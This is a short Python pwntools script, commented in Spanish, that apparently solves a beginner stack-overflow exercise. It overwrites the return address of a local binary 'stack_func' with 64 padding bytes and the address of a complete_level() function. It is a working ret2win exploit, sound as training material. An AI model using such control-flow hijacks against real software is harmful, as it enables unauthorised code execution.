from pwn import *

elf = ELF('./stack_func')

p = elf.process() #Ejecutmos stack_func

payload = b"A"*64 + p64(0x40068d) # Rellenamos el buffer con 64 bytes y luego la dirección de la función complete_level()
p.sendline(payload) # Enviamos el payload

print(p.recv()) # Imprimimos la respuesta del programa

